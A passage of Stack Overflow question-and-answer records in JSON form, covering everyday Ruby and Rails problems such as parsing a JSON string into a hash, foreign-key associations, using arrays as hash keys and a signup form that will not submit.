"https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 2, "creation_date": 1535455843, "post_id": 52056628, "comment_id": 91063693, "body": "That&#39;s not a hash, though. It&#39;s a string."}], "answers": [{"tags": [], "owner": {"reputation": 2585, "user_id": 696257, "user_type": "registered", "accept_rate": 42, "profile_image": "https://i.stack.imgur.com/oN4Zu.png?s=128&g=1", "display_name": "dkulkarni", "link": "https://stackoverflow.com/users/696257/dkulkarni"}, "is_accepted": false, "score": 4, "last_activity_date": 1535456024, "creation_date": 1535456024, "answer_id": 52056856, "question_id": 52056628, "link": "https://stackoverflow.com/questions/52056628/print-out-elements-in-a-hash-table-ruby/52056856#52056856", "title": "Print out elements in a hash table, Ruby", "body": "<p>You'll need to first convert your string to a hash.</p>\n\n<pre><code>require 'json'\n\nmy_hash = JSON.parse(hash)\nmy_hash.each do |key, value|\n  puts value\nend\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 11, "user_id": 6768869, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-x8JXhGIq6Mk/AAAAAAAAAAI/AAAAAAAAAFY/MZHOongrJ7s/photo.jpg?sz=128", "display_name": "aditi banerjee", "link": "https://stackoverflow.com/users/6768869/aditi-banerjee"}, "is_accepted": false, "score": 0, "last_activity_date": 1545385811, "creation_date": 1545385811, "answer_id": 53882539, "question_id": 52056628, "link": "https://stackoverflow.com/questions/52056628/print-out-elements-in-a-hash-table-ruby/53882539#53882539", "title": "Print out elements in a hash table, Ruby", "body": "<p>You can also do the following:</p>\n\n<pre><code>require 'json'\nvalues = JSON.parse(hash).map {|k,v| v}\nvalues.each do |value|\n  puts value\nend\n</code></pre>\n"}], "owner": {"reputation": 143, "user_id": 2909180, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/b679bf3d6512c5e95106931a34f81afb?s=128&d=identicon&r=PG&f=1", "display_name": "user2909180", "link": "https://stackoverflow.com/users/2909180/user2909180"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 160, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1545385811, "creation_date": 1535455245, "last_edit_date": 1535455818, "question_id": 52056628, "link": "https://stackoverflow.com/questions/52056628/print-out-elements-in-a-hash-table-ruby", "title": "Print out elements in a hash table, Ruby", "body": "<p>I have a hash table that looks like this: </p>\n\n<pre><code>hash =\n\"{\\\"url\\\":\\\"/system/message\\\",\\\"device\\\":\\\"UNKNOWN\\\",\\\"version\\\":\\\"1.0\\\",\\\"timestamp\\\":\\\"2018-08-28T11:16:29.516617Z\\\",\\\"object\\\":{\\\"timestamp\\\":\\\"2018-08-28T11:16:29.516490Z\\\",\\\"id\\\":9800,\\\"debug_level\\\":2,\\\"message\\\":\\\"Got new port configuration\\\"}}\"\n\n hash.each do |variable|\n    puts variable\n end\n</code></pre>\n\n<p>This do not work</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "associations"], "comments": [{"owner": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "edited": false, "score": 0, "creation_date": 1535454626, "post_id": 52056412, "comment_id": 91062984, "body": "Try <code>belongs_to :supplier, primary_key: &#39;code&#39;, foreign_key: &#39;supplier_code&#39;</code>."}], "answers": [{"comments": [{"owner": {"reputation": 23, "user_id": 10284396, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3b78a23a7c3b94f23013bbc0f195d2cf?s=128&d=identicon&r=PG&f=1", "display_name": "bull", "link": "https://stackoverflow.com/users/10284396/bull"}, "edited": false, "score": 0, "creation_date": 1535462835, "post_id": 52056477, "comment_id": 91068399, "body": "why when i want to build Supplier.last.skies.new  is set supplier_code as supplier id but not like a supplier code?"}, {"owner": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "edited": false, "score": 0, "creation_date": 1535475015, "post_id": 52056477, "comment_id": 91075982, "body": "<code>class_name: &#39;Supplier&#39;</code> is redundant in <code>belongs_to</code> association."}, {"owner": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "edited": false, "score": 0, "creation_date": 1535475071, "post_id": 52056477, "comment_id": 91076014, "body": "Do we need to specify <code>primary_key: &#39;id&#39;</code> in <code>has_many :skies</code>? Isn&#39;t that default value of it?"}], "tags": [], "owner": {"reputation": 6207, "user_id": 5117953, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/Ca0RW.jpg?s=128&g=1", "display_name": "Vishal", "link": "https://stackoverflow.com/users/5117953/vishal"}, "is_accepted": true, "score": 1, "last_activity_date": 1535454730, "creation_date": 1535454730, "answer_id": 52056477, "question_id": 52056412, "link": "https://stackoverflow.com/questions/52056412/rails-foreign-key-not-id/52056477#52056477", "title": "Rails foreign_key not id", "body": "<p>You must need to define on another model</p>\n\n<pre><code>class Sku &lt; ApplicationRecord\n  validates :sku, :supplier_code, :name, :price, presence: true\n  belongs_to :supplier, class_name: 'Supplier', foreign_key: 'code'\nend\n</code></pre>\n\n<p>and</p>\n\n<pre><code>class Supplier &lt; ApplicationRecord\n  validates :code, :name, presence: true\n  has_many :skies, class_name: 'Sku', primary_key: 'id', foreign_key: 'code'\nend\n</code></pre>\n"}], "owner": {"reputation": 23, "user_id": 10284396, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3b78a23a7c3b94f23013bbc0f195d2cf?s=128&d=identicon&r=PG&f=1", "display_name": "bull", "link": "https://stackoverflow.com/users/10284396/bull"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 35, "favorite_count": 0, "accepted_answer_id": 52056477, "answer_count": 1, "score": 0, "last_activity_date": 1535454860, "creation_date": 1535454507, "question_id": 52056412, "link": "https://stackoverflow.com/questions/52056412/rails-foreign-key-not-id", "title": "Rails foreign_key not id", "body": "<p>I have two tables </p>\n\n<pre><code>class Sku &lt; ApplicationRecord\n  validates :sku, :supplier_code, :name, :price, presence: true\n  belongs_to :supplier, class_name: 'Supplier', foreign_key: 'code'\nend\n</code></pre>\n\n<p>and </p>\n\n<pre><code> class Supplier &lt; ApplicationRecord\n  validates :code, :name, presence: true\n  has_many :skies, class_name: 'Sku'\nend\n</code></pre>\n\n<p>i set <code>foreign_key</code> as a <code>code</code> field </p>\n\n<p>but when i tried to create <code>sku</code> with <code>supplier_code</code> which i set to supplier</p>\n\n<pre><code>Supplier.create(code:4,name:2) =&gt; OK\n</code></pre>\n\n<p>i have got an error <code>{:supplier=&gt;[{:error=&gt;:blank}]},</code></p>\n\n<pre><code>Sku.create(name:2,price:2,sku:3,supplier_code:4).errors\n</code></pre>\n"}, {"tags": ["javascript", "ruby-on-rails", "ruby", "html", "handlebars.js"], "comments": [{"owner": {"reputation": 1984, "user_id": 2706051, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0a122031711d9d526f60ba51a3d6f119?s=128&d=identicon&r=PG&f=1", "display_name": "Christophe", "link": "https://stackoverflow.com/users/2706051/christophe"}, "edited": false, "score": 0, "creation_date": 1535539187, "post_id": 52055934, "comment_id": 91100419, "body": "How is your template rendered the first time (without javascript) ? Second question, if you included your template in the page and want it to render it multiple time just why not retrieving the content from the id #template and the render it again (but avoid putting the the template in the object that you want to render otherwise the content will be lost)."}, {"owner": {"reputation": 403, "user_id": 2949560, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/IxWz9.png?s=128&g=1", "display_name": "radiantshaw", "link": "https://stackoverflow.com/users/2949560/radiantshaw"}, "reply_to_user": {"reputation": 1984, "user_id": 2706051, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0a122031711d9d526f60ba51a3d6f119?s=128&d=identicon&r=PG&f=1", "display_name": "Christophe", "link": "https://stackoverflow.com/users/2706051/christophe"}, "edited": false, "score": 0, "creation_date": 1535548755, "post_id": 52055934, "comment_id": 91106840, "body": "I want my template to render the first time but without JavaScript. Presumably with Server Side language. But even after that I need the template to stay intact so that I can access it in my JavaScript."}, {"owner": {"reputation": 1984, "user_id": 2706051, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0a122031711d9d526f60ba51a3d6f119?s=128&d=identicon&r=PG&f=1", "display_name": "Christophe", "link": "https://stackoverflow.com/users/2706051/christophe"}, "edited": false, "score": 0, "creation_date": 1535548886, "post_id": 52055934, "comment_id": 91106924, "body": "So you need help on how to do it on the server or on how to do it with javascript ?"}, {"owner": {"reputation": 403, "user_id": 2949560, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/IxWz9.png?s=128&g=1", "display_name": "radiantshaw", "link": "https://stackoverflow.com/users/2949560/radiantshaw"}, "reply_to_user": {"reputation": 1984, "user_id": 2706051, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0a122031711d9d526f60ba51a3d6f119?s=128&d=identicon&r=PG&f=1", "display_name": "Christophe", "link": "https://stackoverflow.com/users/2706051/christophe"}, "edited": false, "score": 0, "creation_date": 1535549106, "post_id": 52055934, "comment_id": 91107066, "body": "I know how to do it in JavaScript. I just want to be able to keep the template around even after rendering it on Server with Ruby on Rails. One way I could achieve that is through duplication. But I want a better solution."}, {"owner": {"reputation": 1984, "user_id": 2706051, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0a122031711d9d526f60ba51a3d6f119?s=128&d=identicon&r=PG&f=1", "display_name": "Christophe", "link": "https://stackoverflow.com/users/2706051/christophe"}, "edited": false, "score": 0, "creation_date": 1535549404, "post_id": 52055934, "comment_id": 91107280, "body": "I see ... then the only solution that I see is to duplicate it : once to process the template during page rendering and once in the page itself (or download it via an ajax request). I think that it is already what you wanted to do and I hardly see any other solution. Sorry I can&#39;t help you."}], "owner": {"reputation": 403, "user_id": 2949560, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/IxWz9.png?s=128&g=1", "display_name": "radiantshaw", "link": "https://stackoverflow.com/users/2949560/radiantshaw"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 20, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1535548973, "creation_date": 1535452917, "last_edit_date": 1535548973, "question_id": 52055934, "link": "https://stackoverflow.com/questions/52055934/rendering-handlebars-templates-for-the-first-time-but-also-keeping-them-around-f", "title": "Rendering Handlebars templates for the first time but also keeping them around for subsequent renderings?", "body": "<p>I used Handlebars for quite some time and my approach is to put the template where it's supposed to render in HTML file. For example.</p>\n\n<pre><code>&lt;div id=\"template-parent\"&gt;\n  &lt;script type=\"text/template\" id=\"template\"&gt;\n    &lt;!-- The template goes here --&gt;\n  &lt;/script&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>The <code>#template</code> is suppose to render inside <code>#template-parent</code>.</p>\n\n<p>What I can do now is call the template using JavaScript and render it in the proper place with the proper data whenever I want. But what I want is to be able to render it the first time the page loads, with Ruby. But after rendering, I still want to keep the template intact for subsequent renderings. Any ideas how I might be able to achieve it?</p>\n"}, {"tags": ["ruby", "data-structures", "ruby-hash"], "comments": [{"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 2, "creation_date": 1535449930, "post_id": 52054785, "comment_id": 91060037, "body": "Use an array <code>[vertex, material]</code> as a key."}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1535452080, "post_id": 52054785, "comment_id": 91061327, "body": "<i>&quot;Is that supported by a hash map?&quot;</i> -- Yes. In ruby, you can use <b>any object</b> (including, for example, an <code>Array</code>) as a hash key. Unlike some other languages, with may only allow <code>String</code>s and <code>Integer</code>s as hash keys."}, {"owner": {"reputation": 559, "user_id": 3106200, "user_type": "registered", "accept_rate": 27, "profile_image": "https://www.gravatar.com/avatar/778eff4a90d16b8ee5304fc52605bdb7?s=128&d=identicon&r=PG&f=1", "display_name": "user923", "link": "https://stackoverflow.com/users/3106200/user923"}, "reply_to_user": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1535452253, "post_id": 52054785, "comment_id": 91061459, "body": "Thanks guys. Never used a languages with this sort of flexibility before. In terms of code, would it literally just support using what @mudasobwa wrote in place of the vertex for the key? If so, that&#39;s awesome and if you answer it, I&#39;ll give you credit for the correct answer."}], "answers": [{"comments": [{"owner": {"reputation": 559, "user_id": 3106200, "user_type": "registered", "accept_rate": 27, "profile_image": "https://www.gravatar.com/avatar/778eff4a90d16b8ee5304fc52605bdb7?s=128&d=identicon&r=PG&f=1", "display_name": "user923", "link": "https://stackoverflow.com/users/3106200/user923"}, "edited": false, "score": 1, "creation_date": 1535458234, "post_id": 52056126, "comment_id": 91065289, "body": "Thank you for breaking that down for me. Very helpful!"}], "tags": [], "owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "is_accepted": true, "score": 1, "last_activity_date": 1535453623, "creation_date": 1535453623, "answer_id": 52056126, "question_id": 52054785, "link": "https://stackoverflow.com/questions/52054785/using-multiple-classes-together-as-a-hash-key/52056126#52056126", "title": "Using multiple classes together as a hash key", "body": "<p>In Ruby one might use whatever as hash key:</p>\n\n<pre><code>hash = {\n  42 =&gt; \"an integer\",\n  [42, \"forty two\"] =&gt; \"an array\",\n  Class =&gt; \"a class\"\n}\n#\u21d2  {42=&gt;\"an integer\", [42, \"forty two\"]=&gt;\"an array\", Class=&gt;\"a class\"}\n\nhash[[42, \"forty two\"]]\n#\u21d2 \"an array\"\n</code></pre>\n\n<p>That said, in your case you might use an array <code>[vertex, material]</code> as a key:</p>\n\n<pre><code>unless vertices.key?([vertex, material])\n  new_vertices_and_materials &lt;&lt; [vertex, material]\n  vertices[[vertex, material]] = @vertex_index\n  @vertex_index += 1\nend\n</code></pre>\n\n<hr>\n\n<p>The more rubyish approach would be to call <a href=\"https://ruby-doc.org/core/Enumerable.html#method-i-uniq\" rel=\"nofollow noreferrer\"><code>Enumerable#uniq</code></a> on the input and do:</p>\n\n<pre><code>input = [ # example input data\n  [:vertex1, :material1],\n  [:vertex2, :material1],\n  [:vertex2, :material1],\n  [:vertex2, :material2],\n  [:vertex2, :material2]\n]\nnew_vertices_and_materials = input.uniq\nvertices_and_materials_with_index =\n  new_vertices_and_materials.\n    zip(1..new_vertices_and_materials.size).\n    to_h\n#\u21d2 {[:vertex1, :material1]=&gt;1,\n#   [:vertex2, :material1]=&gt;2,\n#   [:vertex2, :material2]=&gt;3}\n</code></pre>\n"}], "owner": {"reputation": 559, "user_id": 3106200, "user_type": "registered", "accept_rate": 27, "profile_image": "https://www.gravatar.com/avatar/778eff4a90d16b8ee5304fc52605bdb7?s=128&d=identicon&r=PG&f=1", "display_name": "user923", "link": "https://stackoverflow.com/users/3106200/user923"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 49, "favorite_count": 0, "accepted_answer_id": 52056126, "answer_count": 1, "score": 0, "last_activity_date": 1535453623, "creation_date": 1535449368, "last_edit_date": 1535450524, "question_id": 52054785, "link": "https://stackoverflow.com/questions/52054785/using-multiple-classes-together-as-a-hash-key", "title": "Using multiple classes together as a hash key", "body": "<p>I found a script that calculates 3D models and combines identical vertices. It has the following logic, where according to my understanding, vertices are hash maps of vertex class:</p>\n\n<pre><code>unless vertices.key?(vertex)\n  new_vertices &lt;&lt; vertex\n  vertices[ vertex ] = @vertex_index\n  @vertex_index += 1\nend\n</code></pre>\n\n<p>If we find a <code>vertex</code> that is unique, we add it to the <code>new_vertices</code> array.</p>\n\n<p>I'd like to modify this so that the key for the hash map is a combination of a vertex and a material (both are classes from Sketchup, which is the software this script runs in). What is the best way to do this so that each key is a combination of two classes instead of one? Some sort of duple or class holding both the vertex and the material? Is that supported by a hash map?</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "ruby-on-rails-5"], "comments": [{"owner": {"reputation": 2902, "user_id": 1202324, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/4e62f40c62dda03af2f033c651f36311?s=128&d=identicon&r=PG", "display_name": "Denny Mueller", "link": "https://stackoverflow.com/users/1202324/denny-mueller"}, "edited": false, "score": 0, "creation_date": 1535450965, "post_id": 52054599, "comment_id": 91060656, "body": "Whats the ouput of <code>rake routes</code>?"}, {"owner": {"reputation": 1397, "user_id": 4940278, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/06NHi.jpg?s=128&g=1", "display_name": "Luna Lovegood", "link": "https://stackoverflow.com/users/4940278/luna-lovegood"}, "edited": false, "score": 0, "creation_date": 1535451901, "post_id": 52054599, "comment_id": 91061198, "body": "what is the error message?"}, {"owner": {"reputation": 1397, "user_id": 4940278, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/06NHi.jpg?s=128&g=1", "display_name": "Luna Lovegood", "link": "https://stackoverflow.com/users/4940278/luna-lovegood"}, "edited": false, "score": 0, "creation_date": 1535451947, "post_id": 52054599, "comment_id": 91061228, "body": "haha, you might have as well shared your git repo link."}, {"owner": {"reputation": 1263, "user_id": 10221813, "user_type": "registered", "profile_image": "https://graph.facebook.com/10160530708235447/picture?type=large", "display_name": "uno", "link": "https://stackoverflow.com/users/10221813/uno"}, "reply_to_user": {"reputation": 2902, "user_id": 1202324, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/4e62f40c62dda03af2f033c651f36311?s=128&d=identicon&r=PG", "display_name": "Denny Mueller", "link": "https://stackoverflow.com/users/1202324/denny-mueller"}, "edited": false, "score": 0, "creation_date": 1535453277, "post_id": 52054599, "comment_id": 91062138, "body": "@DennyMueller here is my rake routes: <a href=\"https://paste.ee/p/m5CS7\" rel=\"nofollow noreferrer\">paste.ee/p/m5CS7</a>"}, {"owner": {"reputation": 1263, "user_id": 10221813, "user_type": "registered", "profile_image": "https://graph.facebook.com/10160530708235447/picture?type=large", "display_name": "uno", "link": "https://stackoverflow.com/users/10221813/uno"}, "reply_to_user": {"reputation": 1397, "user_id": 4940278, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/06NHi.jpg?s=128&g=1", "display_name": "Luna Lovegood", "link": "https://stackoverflow.com/users/4940278/luna-lovegood"}, "edited": false, "score": 0, "creation_date": 1535453338, "post_id": 52054599, "comment_id": 91062173, "body": "@Surya Haha, I do have it in there - but not updated.  I may include it if i need to. :)"}, {"owner": {"reputation": 1263, "user_id": 10221813, "user_type": "registered", "profile_image": "https://graph.facebook.com/10160530708235447/picture?type=large", "display_name": "uno", "link": "https://stackoverflow.com/users/10221813/uno"}, "reply_to_user": {"reputation": 1397, "user_id": 4940278, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/06NHi.jpg?s=128&g=1", "display_name": "Luna Lovegood", "link": "https://stackoverflow.com/users/4940278/luna-lovegood"}, "edited": false, "score": 0, "creation_date": 1535454061, "post_id": 52054599, "comment_id": 91062641, "body": "@Surya That&#39;s the issue! There is no error message, success message, redirect (just reloads the same page with blank fields) or entries/storing.  But this is the closest thing, my CMD after i pass through and add a test signup user: <a href=\"https://pastebin.com/mQpgqv9A\" rel=\"nofollow noreferrer\">pastebin.com/mQpgqv9A</a>"}, {"owner": {"reputation": 1263, "user_id": 10221813, "user_type": "registered", "profile_image": "https://graph.facebook.com/10160530708235447/picture?type=large", "display_name": "uno", "link": "https://stackoverflow.com/users/10221813/uno"}, "edited": false, "score": 0, "creation_date": 1535455343, "post_id": 52054599, "comment_id": 91063395, "body": "Git : <a href=\"https://github.com/brandnamewater/App3\" rel=\"nofollow noreferrer\">github.com/brandnamewater/App3</a>"}, {"owner": {"reputation": 2902, "user_id": 1202324, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/4e62f40c62dda03af2f033c651f36311?s=128&d=identicon&r=PG", "display_name": "Denny Mueller", "link": "https://stackoverflow.com/users/1202324/denny-mueller"}, "edited": false, "score": 0, "creation_date": 1535455622, "post_id": 52054599, "comment_id": 91063563, "body": "I am curious where you get <code>signup_path</code> from? Because you pass this path as url to your form but this path does not exists so I guess it defaults to <code>users#new</code> path but you want to end up in the <code>users#create</code> action. Also the routes.rb in the pastebin is different to the one in your github repository."}, {"owner": {"reputation": 1263, "user_id": 10221813, "user_type": "registered", "profile_image": "https://graph.facebook.com/10160530708235447/picture?type=large", "display_name": "uno", "link": "https://stackoverflow.com/users/10221813/uno"}, "reply_to_user": {"reputation": 2902, "user_id": 1202324, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/4e62f40c62dda03af2f033c651f36311?s=128&d=identicon&r=PG", "display_name": "Denny Mueller", "link": "https://stackoverflow.com/users/1202324/denny-mueller"}, "edited": false, "score": 0, "creation_date": 1535458392, "post_id": 52054599, "comment_id": 91065373, "body": "@DennyMueller Check my github App3... I added the signup_path for kicks because the second tutorial mentioned it (i am new).  Did it just to see it anything would change, nothing happened so it was pointless.  I was just desperate.  The git hub is the official.  The pastebin is wacky"}, {"owner": {"reputation": 1263, "user_id": 10221813, "user_type": "registered", "profile_image": "https://graph.facebook.com/10160530708235447/picture?type=large", "display_name": "uno", "link": "https://stackoverflow.com/users/10221813/uno"}, "edited": false, "score": 0, "creation_date": 1535458498, "post_id": 52054599, "comment_id": 91065433, "body": "Did you see anything wrong with the github app3? I went over that video tutorial on the signin feature a bunch of times already and haven&#39;t found anything that stood out to me.  I&#39;m doing something wrong but cannot see what it is!"}, {"owner": {"reputation": 2902, "user_id": 1202324, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/4e62f40c62dda03af2f033c651f36311?s=128&d=identicon&r=PG", "display_name": "Denny Mueller", "link": "https://stackoverflow.com/users/1202324/denny-mueller"}, "edited": false, "score": 0, "creation_date": 1535465082, "post_id": 52054599, "comment_id": 91069897, "body": "You definitely should sort out some things. There is tons of different versions and explanations going on here. Different git and different pastebins. To answer your question: Your <code>rake routes</code> does not have signup_path so your login form cant work since the url option seems to be ommited and defaults to the <code>users#new</code> path. Since this action only assigns a variable your app actually works like expected from the code. I guess I am out of here since this wacky question just pulls other users into wacky solution guessing. This is not how SO works."}], "answers": [{"comments": [{"owner": {"reputation": 1263, "user_id": 10221813, "user_type": "registered", "profile_image": "https://graph.facebook.com/10160530708235447/picture?type=large", "display_name": "uno", "link": "https://stackoverflow.com/users/10221813/uno"}, "edited": false, "score": 0, "creation_date": 1535453570, "post_id": 52055792, "comment_id": 91062327, "body": "I previously tried the flash[... but it also did not work.  resources :users except[:create] created an error and won&#39;t load  I have not installed devise, I will take a look.  Haven&#39;t heard of it. thanks"}, {"owner": {"reputation": 38, "user_id": 1052511, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0a254da796ed89c81896905bdbe5527?s=128&d=identicon&r=PG", "display_name": "benjy", "link": "https://stackoverflow.com/users/1052511/benjy"}, "reply_to_user": {"reputation": 1263, "user_id": 10221813, "user_type": "registered", "profile_image": "https://graph.facebook.com/10160530708235447/picture?type=large", "display_name": "uno", "link": "https://stackoverflow.com/users/10221813/uno"}, "edited": false, "score": 0, "creation_date": 1535454056, "post_id": 52055792, "comment_id": 91062636, "body": "there is no app folder in the your git repo. may be you should reconsider pushing new project since they are lot missing files"}, {"owner": {"reputation": 1263, "user_id": 10221813, "user_type": "registered", "profile_image": "https://graph.facebook.com/10160530708235447/picture?type=large", "display_name": "uno", "link": "https://stackoverflow.com/users/10221813/uno"}, "edited": false, "score": 0, "creation_date": 1535455333, "post_id": 52055792, "comment_id": 91063385, "body": "Thanks for the heads up.  Solved: <a href=\"https://github.com/brandnamewater/App3\" rel=\"nofollow noreferrer\">github.com/brandnamewater/App3</a>"}, {"owner": {"reputation": 1263, "user_id": 10221813, "user_type": "registered", "profile_image": "https://graph.facebook.com/10160530708235447/picture?type=large", "display_name": "uno", "link": "https://stackoverflow.com/users/10221813/uno"}, "edited": false, "score": 0, "creation_date": 1535458251, "post_id": 52055792, "comment_id": 91065297, "body": "not one bit ha ;( sorry for confusion.  i meant solved as in i fixed the github rep"}], "tags": [], "owner": {"reputation": 38, "user_id": 1052511, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0a254da796ed89c81896905bdbe5527?s=128&d=identicon&r=PG", "display_name": "benjy", "link": "https://stackoverflow.com/users/1052511/benjy"}, "is_accepted": false, "score": 0, "last_activity_date": 1535452460, "creation_date": 1535452460, "answer_id": 52055792, "question_id": 52054599, "link": "https://stackoverflow.com/questions/52054599/simply-login-feature-not-working-not-redirecting-or-storing/52055792#52055792", "title": "Simply Login feature not working (not redirecting or storing)", "body": "<p>Did you try installing <a href=\"https://github.com/plataformatec/devise\" rel=\"nofollow noreferrer\">devise</a> just to see how things work. For notice in your create action in USerController i don't know if it should as you put it but you can try this : </p>\n\n<pre><code>flash[:success] = \"User, created successfully\"\n</code></pre>\n\n<p>And you should try this too, in your routes.rb file : </p>\n\n<pre><code>resources :users except[:create]\n</code></pre>\n\n<p>However it is a little hard to follow all your code.</p>\n"}, {"comments": [{"owner": {"reputation": 2157, "user_id": 5849229, "user_type": "registered", "accept_rate": 39, "profile_image": "https://www.gravatar.com/avatar/d77f7eef721220ff7fa979025e6d31b9?s=128&d=identicon&r=PG&f=1", "display_name": "gdfgdfg", "link": "https://stackoverflow.com/users/5849229/gdfgdfg"}, "reply_to_user": {"reputation": 1263, "user_id": 10221813, "user_type": "registered", "profile_image": "https://graph.facebook.com/10160530708235447/picture?type=large", "display_name": "uno", "link": "https://stackoverflow.com/users/10221813/uno"}, "edited": false, "score": 0, "creation_date": 1535458985, "post_id": 52057573, "comment_id": 91065780, "body": "Routes doesn&#39;t matter. This is part of the HTML (your views). Form sends data depends on its <code>method</code> attribute. You need to set it to POST."}, {"owner": {"reputation": 1263, "user_id": 10221813, "user_type": "registered", "profile_image": "https://graph.facebook.com/10160530708235447/picture?type=large", "display_name": "uno", "link": "https://stackoverflow.com/users/10221813/uno"}, "edited": false, "score": 0, "creation_date": 1535459110, "post_id": 52057573, "comment_id": 91065853, "body": "Here&#39;s my git app for: <a href=\"https://github.com/brandnamewater/App3\" rel=\"nofollow noreferrer\">github.com/brandnamewater/App3</a> \u200b  You&#39;re saying to change my view/users/new.html.erb files form_for?  orrr something else?  RN, its this: &lt;%= form_for @user do |f| %&gt;  Which is how the tutorial displays it too.  But i posted my github above and everyhing should be in there.  I&#39;&#39;m not understanding this.  I&#39;ve looked into this for answers on a few tutorials and i&#39;m apparently doing everything right - from what i see"}, {"owner": {"reputation": 2157, "user_id": 5849229, "user_type": "registered", "accept_rate": 39, "profile_image": "https://www.gravatar.com/avatar/d77f7eef721220ff7fa979025e6d31b9?s=128&d=identicon&r=PG&f=1", "display_name": "gdfgdfg", "link": "https://stackoverflow.com/users/5849229/gdfgdfg"}, "reply_to_user": {"reputation": 1263, "user_id": 10221813, "user_type": "registered", "profile_image": "https://graph.facebook.com/10160530708235447/picture?type=large", "display_name": "uno", "link": "https://stackoverflow.com/users/10221813/uno"}, "edited": false, "score": 0, "creation_date": 1535464691, "post_id": 52057573, "comment_id": 91069611, "body": "<code>form_for @user, method: &quot;post&quot;</code>"}], "tags": [], "owner": {"reputation": 2157, "user_id": 5849229, "user_type": "registered", "accept_rate": 39, "profile_image": "https://www.gravatar.com/avatar/d77f7eef721220ff7fa979025e6d31b9?s=128&d=identicon&r=PG&f=1", "display_name": "gdfgdfg", "link": "https://stackoverflow.com/users/5849229/gdfgdfg"}, "is_accepted": false, "score": 0, "last_activity_date": 1535458259, "creation_date": 1535458259, "answer_id": 52057573, "question_id": 52054599, "link": "https://stackoverflow.com/questions/52054599/simply-login-feature-not-working-not-redirecting-or-storing/52057573#52057573", "title": "Simply Login feature not working (not redirecting or storing)", "body": "<p>I think you are using <code>GET</code>, but not <code>POST</code> in your form:<code>&lt;form method=\"get\"...&gt;</code> instead <code>&lt;form method = \"post\"....&gt;</code>, because:</p>\n\n<blockquote>\n  <p>When i click \"submit\", nothing happens. I get this URL:\n  